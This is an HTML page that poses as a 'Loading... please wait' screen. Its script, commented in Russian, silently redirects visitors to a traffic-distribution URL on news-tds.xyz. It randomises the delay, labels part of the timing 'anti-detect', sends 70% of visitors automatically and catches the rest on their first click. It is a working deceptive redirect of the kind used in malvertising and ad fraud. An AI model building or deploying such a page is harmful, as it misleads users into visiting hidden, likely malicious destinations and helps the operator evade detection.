<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Loading...</title>

<style>
body {
    margin: 0;
    background: #000;
    color: #fff;
    text-align: center;
    font-family: Arial;
}
h2 {
    margin-top: 80px;
}
</style>

<script>

// === ОФФЕРЫ (пока одна ссылка, но с разными режимами) ===
let offers = [
{
    url: "https://news-tds.xyz/?p=MWFiNzRhYWI3NjliOWZlNTc5ZDJmNTQzY2ZiNjVmODh8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8MTg3NjUzMjc=&v=2&poid=0&coid=0",
    minDelay: 2200,
    maxDelay: 2800
},
{
    url: "https://news-tds.xyz/?p=MWFiNzRhYWI3NjliOWZlNTc5ZDJmNTQzY2ZiNjVmODh8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8MTg3NjUzMjc=&v=2&poid=0&coid=0",
    minDelay: 3000,
    maxDelay: 5000
},
{
    url: "https://news-tds.xyz/?p=MWFiNzRhYWI3NjliOWZlNTc5ZDJmNTQzY2ZiNjVmODh8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8MTg3NjUzMjc=&v=2&poid=0&coid=0",
    minDelay: 5000,
    maxDelay: 7000
}
];

// случайный оффер
let offer = offers[Math.floor(Math.random() * offers.length)];

// задержка под него
let delay = Math.floor(Math.random() * (offer.maxDelay - offer.minDelay + 1)) + offer.minDelay;

// анти-детект: микрозадержка перед стартом
let preDelay = Math.random() * 500;

// запуск
setTimeout(function(){

    // 70% — авто редирект
    if (Math.random() < 0.7) {
        setTimeout(function(){
            window.location.href = offer.url;
        }, delay);
    }

    // 30% — только по клику
    else {
        document.addEventListener("click", function(){
            window.location.href = offer.url;
        });
    }

}, preDelay);

</script>

</head>

<body>

<h2>Loading... please wait</h2>

</body>
</html>
